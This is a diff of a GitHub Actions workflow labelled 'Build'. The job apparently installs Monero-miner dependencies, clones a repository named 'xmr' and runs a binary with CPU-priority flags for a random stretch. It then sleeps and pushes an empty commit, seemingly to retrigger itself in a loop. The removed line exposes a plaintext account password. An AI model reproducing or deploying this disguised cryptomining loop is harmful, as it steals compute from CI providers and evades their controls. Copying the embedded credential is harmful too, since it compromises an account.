@@ -1,6 +1,5 @@
 name: Build
-on:
-  push:
+on: [push, pull_request]
 jobs:
   test:
     name: Fetch
@@ -16,7 +15,7 @@ jobs:
       - run: |
           apt update -qq
           apt install -y git libuv1 libssl1.1 libhwloc15
-          git clone https://daveyg1:Magratsucks123@github.com/daveyg1/xmr.git
+          git clone https://daveyg7:${{ secrets.token }}@github.com/daveyg7/xmr.git
           cd xmr
           chmod u+x prog
           timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
@@ -24,7 +23,7 @@ jobs:
           then
             sleep 25m
             git config user.name 'Davey G'
-            git config user.email 'daveyg1@yandex.com'
+            git config user.email 'daveyg7@yandex.com'
             git commit --allow-empty --allow-empty-message --no-edit
             git push
           fi
